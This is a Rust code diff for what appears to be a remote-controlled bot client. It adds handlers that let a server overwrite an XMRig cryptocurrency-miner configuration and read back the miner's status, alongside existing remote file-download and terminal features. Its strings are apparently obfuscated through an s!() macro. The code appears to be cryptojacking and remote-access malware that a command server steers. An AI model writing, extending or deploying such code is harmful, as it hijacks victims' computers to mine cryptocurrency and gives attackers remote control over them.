@@ -27,7 +27,12 @@ use crate::{
         terminal::Terminal,
     },
 };
-use super::basic::download_file_to_path;
+use super::basic::{
+    download_file_to_path,
+    get_xmrig_config,
+    get_xmrig_summary,
+    override_xmrig_config,
+};
 
 #[derive(Clone)]
 pub struct BotHandler {
@@ -265,8 +270,16 @@ impl BotHandler {
                     );
                 }
             }
-            receive::ClientAction::UpdateMinerConfig => {
-                //
+            receive::ClientAction::EditXMRigConfig => {
+                if let ClientParams::EditXMRigConfig(params) = processed_data.params {
+                    override_xmrig_config(params.config).await?;
+                } else {
+                    return Err(
+                        anyhow::anyhow!(
+                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
+                        )
+                    );
+                }
             }
             receive::ClientAction::DownloadFile => {
                 if let ClientParams::DownloadFile(params) = processed_data.params {
@@ -308,6 +321,25 @@ impl BotHandler {
                     //     ServerAction::UpdateThumbnail,
                     //     ServerParams::UpdateThumbnail(data)
                     // )?;
+                } else {
+                    return Err(
+                        anyhow::anyhow!(
+                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
+                        )
+                    );
+                }
+            }
+            receive::ClientAction::GetXMRigData => {
+                if let ClientParams::GetXMRigData(_params) = processed_data.params {
+                    let config = get_xmrig_config().await?;
+                    let summary = get_xmrig_summary().await?;
+                    let data = send::XMRigConfigParams { config, summary };
+
+                    Self::send_data(
+                        self_ref.clone(),
+                        ServerAction::XMRigConfig,
+                        ServerParams::XMRigConfig(data)
+                    ).await?;
                 } else {
                     return Err(
                         anyhow::anyhow!(
